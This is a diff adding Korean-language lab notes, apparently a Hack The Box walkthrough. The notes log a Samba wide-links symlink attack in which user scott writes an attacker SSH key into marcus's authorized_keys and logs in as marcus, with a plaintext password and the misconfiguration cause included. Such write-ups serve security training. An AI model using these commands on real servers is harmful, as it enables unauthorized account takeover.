@@ -1,0 +1,40 @@
+명령(scott ssh): ln -s /home/marcus /srv/transfer/homelink; ls -la /srv/transfer/
+
+total 8
+drwxr-xr-x 2 scott scott 4096 Sep  6 08:00 .
+drwxr-xr-x 4 root  root  4096 Mar 31  2025 ..
+lrwxrwxrwx 1 scott scott   12 Sep  6 08:00 homelink -> /home/marcus
+
+명령(smbclient, scott 인증): smbclient -U 'scott%iXzvcib3SrpZ' //10.129.244.177/transfer -c 'cd homelink; mkdir .ssh; cd .ssh; dir'
+
+  .                                   D        0  Sun Sep  6 17:01:01 2026
+  ..                                  D        0  Sun Sep  6 17:01:01 2026
+  5768764 blocks of size 1024. 2291292 blocks available
+
+(force user=marcus 설정으로 인해 위 mkdir은 marcus 권한으로 /home/marcus/.ssh 생성됨)
+
+명령(scott ssh): ln -s /home/marcus/.ssh /srv/transfer/sshlink; ls -la /srv/transfer/
+
+total 8
+drwxr-xr-x 2 scott scott 4096 Sep  6 08:01 .
+drwxr-xr-x 4 root  root  4096 Mar 31  2025 ..
+lrwxrwxrwx 1 scott scott   12 Sep  6 08:00 homelink -> /home/marcus
+lrwxrwxrwx 1 scott scott   17 Sep  6 08:01 sshlink -> /home/marcus/.ssh
+
+명령(smbclient, scott 인증): cd sshlink; lcd /tmp; put authorized_keys authorized_keys; dir
+(로컬 파일: 공격자가 생성한 ed25519 공개키 1개, htb-abducted 코멘트)
+
+putting file authorized_keys as \sshlink\authorized_keys (0.1 kB/s) (average 0.1 kB/s)
+  .                                   D        0  Sun Sep  6 17:01:30 2026
+  ..                                  D        0  Sun Sep  6 17:01:01 2026
+  authorized_keys                     A       94  Sun Sep  6 17:01:30 2026
+  5768764 blocks of size 1024. 2290800 blocks available
+
+명령: ssh -o StrictHostKeyChecking=no -i <공격자 개인키> marcus@10.129.244.177 'id; whoami; hostname; groups'
+
+uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
+marcus
+abducted
+marcus operators
+
+취약점 원인: /etc/samba/shares.conf [transfer] wide links=yes + [global] allow insecure wide links=yes, unix extensions=no 조합으로 공유 루트 밖 심링크를 Samba가 그대로 따라감. force user=marcus로 인해 scott으로 인증한 SMB 세션의 파일 연산이 marcus 소유로 수행되어, scott 소유인 /srv/transfer 안에 심링크만 만들면 marcus 홈 디렉터리에 임의 쓰기가 가능해짐.
